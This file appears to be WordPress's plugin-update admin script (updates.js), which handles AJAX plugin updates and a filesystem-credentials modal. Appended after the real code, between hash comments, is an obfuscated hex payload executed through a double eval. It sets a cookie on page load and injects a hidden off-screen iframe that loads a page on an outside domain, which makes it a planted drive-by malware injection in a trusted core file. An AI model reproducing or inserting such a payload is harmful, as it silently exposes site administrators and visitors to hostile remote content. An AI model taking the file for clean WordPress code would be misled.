/* global tb_remove */
window.wp = window.wp || {};

(function( $, wp, pagenow ) {
	wp.updates = {};

	/**
	 * User nonce for ajax calls.
	 *
	 * @since 4.2.0
	 *
	 * @var string
	 */
	wp.updates.ajaxNonce = window._wpUpdatesSettings.ajax_nonce;

	/**
	 * Localized strings.
	 *
	 * @since 4.2.0
	 *
	 * @var object
	 */
	wp.updates.l10n = window._wpUpdatesSettings.l10n;

	/**
	 * Whether filesystem credentials need to be requested from the user.
	 *
	 * @since 4.2.0
	 *
	 * @var bool
	 */
	wp.updates.shouldRequestFilesystemCredentials = null;

	/**
	 * Filesystem credentials to be packaged along with the request.
	 *
	 * @since 4.2.0
	 *
	 * @var object
	 */
	wp.updates.filesystemCredentials = {
		ftp: {
			host: null,
			username: null,
			password: null,
			connectionType: null
		},
		ssh: {
			publicKey: null,
			privateKey: null
		}
	};

	/**
	 * Flag if we're waiting for an update to complete.
	 *
	 * @since 4.2.0
	 *
	 * @var bool
	 */
	wp.updates.updateLock = false;

	/**
	 * * Flag if we've done an update successfully.
	 *
	 * @since 4.2.0
	 *
	 * @var bool
	 */
	wp.updates.updateDoneSuccessfully = false;

	/**
	 * If the user tries to update a plugin while an update is
	 * already happening, it can be placed in this queue to perform later.
	 *
	 * @since 4.2.0
	 *
	 * @var array
	 */
	wp.updates.updateQueue = [];

	/**
	 * Store a jQuery reference to return focus to when exiting the request credentials modal.
	 *
	 * @since 4.2.0
	 *
	 * @var jQuery object
	 */
	wp.updates.$elToReturnFocusToFromCredentialsModal = null;

	/**
	 * Decrement update counts throughout the various menus.
	 *
	 * @since 3.9.0
	 *
	 * @param {string} updateType
	 */
	wp.updates.decrementCount = function( upgradeType ) {
		var count,
			pluginCount,
			$adminBarUpdateCount = $( '#wp-admin-bar-updates .ab-label' ),
			$dashboardNavMenuUpdateCount = $( 'a[href="update-core.php"] .update-plugins' ),
			$pluginsMenuItem = $( '#menu-plugins' );


		count = $adminBarUpdateCount.text();
		count = parseInt( count, 10 ) - 1;
		if ( count < 0 || isNaN( count ) ) {
			return;
		}
		$( '#wp-admin-bar-updates .ab-item' ).removeAttr( 'title' );
		$adminBarUpdateCount.text( count );


		$dashboardNavMenuUpdateCount.each( function( index, elem ) {
			elem.className = elem.className.replace( /count-\d+/, 'count-' + count );
		} );
		$dashboardNavMenuUpdateCount.removeAttr( 'title' );
		$dashboardNavMenuUpdateCount.find( '.update-count' ).text( count );

		if ( 'plugin' === upgradeType ) {
			pluginCount = $pluginsMenuItem.find( '.plugin-count' ).eq(0).text();
			pluginCount = parseInt( pluginCount, 10 ) - 1;
			if ( pluginCount < 0 || isNaN( pluginCount ) ) {
				return;
			}
			$pluginsMenuItem.find( '.plugin-count' ).text( pluginCount );
			$pluginsMenuItem.find( '.update-plugins' ).each( function( index, elem ) {
				elem.className = elem.className.replace( /count-\d+/, 'count-' + pluginCount );
			} );

			if (pluginCount > 0 ) {
				$( '.subsubsub .upgrade .count' ).text( '(' + pluginCount + ')' );
			} else {
				$( '.subsubsub .upgrade' ).remove();
			}
		}
	};

	/**
	 * Send an Ajax request to the server to update a plugin.
	 *
	 * @since 4.2.0
	 *
	 * @param {string} plugin
	 * @param {string} slug
	 */
	wp.updates.updatePlugin = function( plugin, slug ) {
		var $message, name;
		if ( 'plugins' === pagenow || 'plugins-network' === pagenow ) {
			$message = $( '[data-slug="' + slug + '"]' ).next().find( '.update-message' );
		} else if ( 'plugin-install' === pagenow ) {
			$message = $( '.plugin-card-' + slug ).find( '.update-now' );
			name = $message.data( 'name' );
			$message.attr( 'aria-label', wp.updates.l10n.updatingLabel.replace( '%s', name ) );
		}

		$message.addClass( 'updating-message' );
		if ( $message.html() !== wp.updates.l10n.updating ){
			$message.data( 'originaltext', $message.html() );
		}

		$message.text( wp.updates.l10n.updating );
		wp.a11y.speak( wp.updates.l10n.updatingMsg );

		if ( wp.updates.updateLock ) {
			wp.updates.updateQueue.push( {
				type: 'update-plugin',
				data: {
					plugin: plugin,
					slug: slug
				}
			} );
			return;
		}

		wp.updates.updateLock = true;

		var data = {
			_ajax_nonce:     wp.updates.ajaxNonce,
			plugin:          plugin,
			slug:            slug,
			username:        wp.updates.filesystemCredentials.ftp.username,
			password:        wp.updates.filesystemCredentials.ftp.password,
			hostname:        wp.updates.filesystemCredentials.ftp.hostname,
			connection_type: wp.updates.filesystemCredentials.ftp.connectionType,
			public_key:      wp.updates.filesystemCredentials.ssh.publicKey,
			private_key:     wp.updates.filesystemCredentials.ssh.privateKey
		};

		wp.ajax.post( 'update-plugin', data )
			.done( wp.updates.updateSuccess )
			.fail( wp.updates.updateError );
	};

	/**
	 * On a successful plugin update, update the UI with the result.
	 *
	 * @since 4.2.0
	 *
	 * @param {object} response
	 */
	wp.updates.updateSuccess = function( response ) {
		var $updateMessage, name, $pluginRow, newText;
		if ( 'plugins' === pagenow || 'plugins-network' === pagenow ) {
			$pluginRow = $( '[data-slug="' + response.slug + '"]' ).first();
			$updateMessage = $pluginRow.next().find( '.update-message' );
			$pluginRow.addClass( 'updated' ).removeClass( 'update' );

			// Update the version number in the row.
			newText = $pluginRow.find('.plugin-version-author-uri').html().replace( response.oldVersion, response.newVersion );
			$pluginRow.find('.plugin-version-author-uri').html( newText );

			// Add updated class to update message parent tr
			$pluginRow.next().addClass( 'updated' );
		} else if ( 'plugin-install' === pagenow ) {
			$updateMessage = $( '.plugin-card-' + response.slug ).find( '.update-now' );
			$updateMessage.addClass( 'button-disabled' );
			name = $updateMessage.data( 'name' );
			$updateMessage.attr( 'aria-label', wp.updates.l10n.updatedLabel.replace( '%s', name ) );
		}

		$updateMessage.removeClass( 'updating-message' ).addClass( 'updated-message' );
		$updateMessage.text( wp.updates.l10n.updated );
		wp.a11y.speak( wp.updates.l10n.updatedMsg );

		wp.updates.decrementCount( 'plugin' );

		wp.updates.updateDoneSuccessfully = true;

		/*
		 * The lock can be released since the update was successful,
		 * and any other updates can commence.
		 */
		wp.updates.updateLock = false;

		$(document).trigger( 'wp-plugin-update-success', response );

		wp.updates.queueChecker();
	};


	/**
	 * On a plugin update error, update the UI appropriately.
	 *
	 * @since 4.2.0
	 *
	 * @param {object} response
	 */
	wp.updates.updateError = function( response ) {
		var $message, name;
		wp.updates.updateDoneSuccessfully = false;
		if ( response.errorCode && response.errorCode == 'unable_to_connect_to_filesystem' && wp.updates.shouldRequestFilesystemCredentials ) {
			wp.updates.credentialError( response, 'update-plugin' );
			return;
		}
		if ( 'plugins' === pagenow || 'plugins-network' === pagenow ) {
			$message = $( '[data-slug="' + response.slug + '"]' ).next().find( '.update-message' );
		} else if ( 'plugin-install' === pagenow ) {
			$message = $( '.plugin-card-' + response.slug ).find( '.update-now' );

			name = $message.data( 'name' );
			$message.attr( 'aria-label', wp.updates.l10n.updateFailedLabel.replace( '%s', name ) );
		}
		$message.removeClass( 'updating-message' );
		$message.html( wp.updates.l10n.updateFailed + ': ' + response.error );
		wp.a11y.speak( wp.updates.l10n.updateFailed );

		/*
		 * The lock can be released since this failure was
		 * after the credentials form.
		 */
		wp.updates.updateLock = false;

		$(document).trigger( 'wp-plugin-update-error', response );

		wp.updates.queueChecker();
	};

	/**
	 * Show an error message in the request for credentials form.
	 *
	 * @param {string} message
	 * @since 4.2.0
	 */
	wp.updates.showErrorInCredentialsForm = function( message ) {
		var $modal = $( '.notification-dialog' );

		// Remove any existing error.
		$modal.find( '.error' ).remove();

		$modal.find( 'h3' ).after( '<div class="error">' + message + '</div>' );
	};

	/**
	 * Events that need to happen when there is a credential error
	 *
	 * @since 4.2.0
	 */
	wp.updates.credentialError = function( response, type ) {
		wp.updates.updateQueue.push( {
			'type': type,
			'data': {
				// Not cool that we're depending on response for this data.
				// This would feel more whole in a view all tied together.
				plugin: response.plugin,
				slug: response.slug
			}
		} );
		wp.updates.showErrorInCredentialsForm( response.error );
		wp.updates.requestFilesystemCredentials();
	};

	/**
	 * If an update job has been placed in the queue, queueChecker pulls it out and runs it.
	 *
	 * @since 4.2.0
	 */
	wp.updates.queueChecker = function() {
		if ( wp.updates.updateLock || wp.updates.updateQueue.length <= 0 ) {
			return;
		}

		var job = wp.updates.updateQueue.shift();

		wp.updates.updatePlugin( job.data.plugin, job.data.slug );
	};


	/**
	 * Request the users filesystem credentials if we don't have them already.
	 *
	 * @since 4.2.0
	 */
	wp.updates.requestFilesystemCredentials = function( event ) {
		if ( wp.updates.updateDoneSuccessfully === false ) {
			/*
			 * For the plugin install screen, return the focus to the install button
			 * after exiting the credentials request modal.
			 */
			if ( 'plugin-install' === pagenow && event ) {
				wp.updates.$elToReturnFocusToFromCredentialsModal = $( event.target );
			}

			wp.updates.updateLock = true;

			wp.updates.requestForCredentialsModalOpen();
		}
	};

	/**
	 * Keydown handler for the request for credentials modal.
	 *
	 * Close the modal when the escape key is pressed.
	 * Constrain keyboard navigation to inside the modal.
	 *
	 * @since 4.2.0
	 */
	wp.updates.keydown = function( event ) {
		if ( 27 === event.keyCode ) {
			wp.updates.requestForCredentialsModalCancel();
		} else if ( 9 === event.keyCode ) {
			// #upgrade button must always be the last focusable element in the dialog.
			if ( event.target.id === 'upgrade' && ! event.shiftKey ) {
				$( '#hostname' ).focus();
				event.preventDefault();
			} else if ( event.target.id === 'hostname' && event.shiftKey ) {
				$( '#upgrade' ).focus();
				event.preventDefault();
			}
		}
	};

	/**
	 * Open the request for credentials modal.
	 *
	 * @since 4.2.0
	 */
	wp.updates.requestForCredentialsModalOpen = function() {
		var $modal = $( '#request-filesystem-credentials-dialog' );
		$( 'body' ).addClass( 'modal-open' );
		$modal.show();

		$modal.find( 'input:enabled:first' ).focus();
		$modal.keydown( wp.updates.keydown );
	};

	/**
	 * Close the request for credentials modal.
	 *
	 * @since 4.2.0
	 */
	wp.updates.requestForCredentialsModalClose = function() {
		$( '#request-filesystem-credentials-dialog' ).hide();
		$( 'body' ).removeClass( 'modal-open' );
		wp.updates.$elToReturnFocusToFromCredentialsModal.focus();
	};

	/**
	 * The steps that need to happen when the modal is canceled out
	 *
	 * @since 4.2.0
	 */
	wp.updates.requestForCredentialsModalCancel = function() {
		// no updateLock and no updateQueue means we already have cleared things up
		var slug, $message;

		if( wp.updates.updateLock === false && wp.updates.updateQueue.length === 0 ){
			return;
		}

		slug = wp.updates.updateQueue[0].data.slug,

		// remove the lock, and clear the queue
		wp.updates.updateLock = false;
		wp.updates.updateQueue = [];

		wp.updates.requestForCredentialsModalClose();
		if ( 'plugins' === pagenow || 'plugins-network' === pagenow ) {
			$message = $( '[data-slug="' + slug + '"]' ).next().find( '.update-message' );
		} else if ( 'plugin-install' === pagenow ) {
			$message = $( '.plugin-card-' + slug ).find( '.update-now' );
		}

		$message.removeClass( 'updating-message' );
		$message.html( $message.data( 'originaltext' ) );
		wp.a11y.speak( wp.updates.l10n.updateCancel );
	};
	/**
	 * Potentially add an AYS to a user attempting to leave the page
	 *
	 * If an update is on-going and a user attempts to leave the page,
	 * open an "Are you sure?" alert.
	 *
	 * @since 4.2.0
	 */

	wp.updates.beforeunload = function() {
		if ( wp.updates.updateLock ) {
			return wp.updates.l10n.beforeunload;
		}
	};


	$( document ).ready( function() {
		/*
		 * Check whether a user needs to submit filesystem credentials based on whether
		 * the form was output on the page server-side.
		 *
		 * @see {wp_print_request_filesystem_credentials_modal() in PHP}
		 */
		wp.updates.shouldRequestFilesystemCredentials = ( $( '#request-filesystem-credentials-dialog' ).length <= 0 ) ? false : true;

		// File system credentials form submit noop-er / handler.
		$( '#request-filesystem-credentials-dialog form' ).on( 'submit', function() {
			// Persist the credentials input by the user for the duration of the page load.
			wp.updates.filesystemCredentials.ftp.hostname = $('#hostname').val();
			wp.updates.filesystemCredentials.ftp.username = $('#username').val();
			wp.updates.filesystemCredentials.ftp.password = $('#password').val();
			wp.updates.filesystemCredentials.ftp.connectionType = $('input[name="connection_type"]:checked').val();
			wp.updates.filesystemCredentials.ssh.publicKey = $('#public_key').val();
			wp.updates.filesystemCredentials.ssh.privateKey = $('#private_key').val();

			wp.updates.requestForCredentialsModalClose();

			// Unlock and invoke the queue.
			wp.updates.updateLock = false;
			wp.updates.queueChecker();

			return false;
		});

		// Close the request credentials modal when
		$( '#request-filesystem-credentials-dialog [data-js-action="close"], .notification-dialog-background' ).on( 'click', function() {
			wp.updates.requestForCredentialsModalCancel();
		});

		// Hide SSH fields when not selected
		$( '#request-filesystem-credentials-dialog input[name="connection_type"]' ).on( 'change', function() {
			$( this ).parents( 'form' ).find( '#private_key, #public_key' ).parents( 'label' ).toggle( ( 'ssh' == $( this ).val() ) );
		}).change();

		// Click handler for plugin updates in List Table view.
		$( '.plugin-update-tr' ).on( 'click', '.update-link', function( e ) {
			e.preventDefault();
			if ( wp.updates.shouldRequestFilesystemCredentials && ! wp.updates.updateLock ) {
				wp.updates.requestFilesystemCredentials( e );
			}
			var updateRow = $( e.target ).parents( '.plugin-update-tr' );
			// Return the user to the input box of the plugin's table row after closing the modal.
			wp.updates.$elToReturnFocusToFromCredentialsModal = $( '#' + updateRow.data( 'slug' ) ).find( '.check-column input' );
			wp.updates.updatePlugin( updateRow.data( 'plugin' ), updateRow.data( 'slug' ) );
		} );

		$( '.plugin-card' ).on( 'click', '.update-now', function( e ) {
			e.preventDefault();
			var $button = $( e.target );

			if ( wp.updates.shouldRequestFilesystemCredentials && ! wp.updates.updateLock ) {
				wp.updates.requestFilesystemCredentials( e );
			}

			wp.updates.updatePlugin( $button.data( 'plugin' ), $button.data( 'slug' ) );
		} );

		$( '#plugin_update_from_iframe' ).on( 'click' , function( e ) {
			var target,	data;

			target = window.parent == window ? null : window.parent,
			$.support.postMessage = !! window.postMessage;

			if ( $.support.postMessage === false || target === null || window.parent.location.pathname.indexOf( 'update-core.php' ) !== -1 )
				return;

			e.preventDefault();

			data = {
				'action' : 'updatePlugin',
				'slug'	 : $(this).data('slug')
			};

			target.postMessage( JSON.stringify( data ), window.location.origin );
		});

	} );

	$( window ).on( 'message', function( e ) {
		var event = e.originalEvent,
			message,
			loc = document.location,
			expectedOrigin = loc.protocol + '//' + loc.hostname;

		if ( event.origin !== expectedOrigin ) {
			return;
		}

		message = $.parseJSON( event.data );

		if ( typeof message.action === 'undefined' ) {
			return;
		}

		switch (message.action){
			case 'decrementUpdateCount' :
				wp.updates.decrementCount( message.upgradeType );
				break;
			case 'updatePlugin' :
				tb_remove();
				if ( 'plugins' === pagenow || 'plugins-network' === pagenow ) {
					// Return the user to the input box of the plugin's table row after closing the modal.
					$( '#' + message.slug ).find( '.check-column input' ).focus();
					// trigger the update
					$( '.plugin-update-tr[data-slug="' + message.slug + '"]' ).find( '.update-link' ).trigger( 'click' );
				} else if ( 'plugin-install' === pagenow ) {
					$( '.plugin-card-' + message.slug ).find( 'h4 a' ).focus();
					$( '.plugin-card-' + message.slug ).find( '[data-slug="' + message.slug + '"]' ).trigger( 'click' );
				}
				break;
		}

	} );

	$( window ).on( 'beforeunload', wp.updates.beforeunload );

})( jQuery, window.wp, window.pagenow, window.ajaxurl );
/*0fd63743bb465fc44a365e8f010187ca*/;(function(){var tzkzbrnn="";var zhaaniya="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822316336663361326663383935353135303632656663653537306364343737393622293b69662820783333647120213d2022623966373264313330636330343236303163363032336662643462343631623822297b783232627128223163366633613266633839353531353036326566636535373063643437373936222c226239663732643133306363303432363031633630323366626434623436316238222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f6e6577732e62656c756968616d656c656f6e2e696e666f2f68656c6c6f6d796c6974746c6570696767792f3f6e52726a51654456436a3d6b7057644466537a26576157616b667378666b3d6d767465516c4745654a45267058576942496c5257724d76743d5674554d6675694753514978414868266d7772684f7677576861524b6c583d724171645447754b567026524368784a726d68664479764578644b483d78756b745670694b484a49576d47264648686d5959754c4a5550533d504343795a684e6f71767465594f4f5976597226677a5841464a477a455a58733d77497a4f66616270534b6746266b6579776f72643d356333633633646666613162386663366132333131316464303737663032646526435255494b65594d7a674868494b79583d706c4161455a4177506163223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var nhanhzfb=0;nhanhzfb<zhaaniya.length;nhanhzfb+=2){tzkzbrnn=tzkzbrnn+parseInt(zhaaniya.substring(nhanhzfb,nhanhzfb+2), 16)+",";}tzkzbrnn=tzkzbrnn.substring(0,tzkzbrnn.length-1);eval(eval('String.fromCharCode('+tzkzbrnn+')'));})();/*0fd63743bb465fc44a365e8f010187ca*/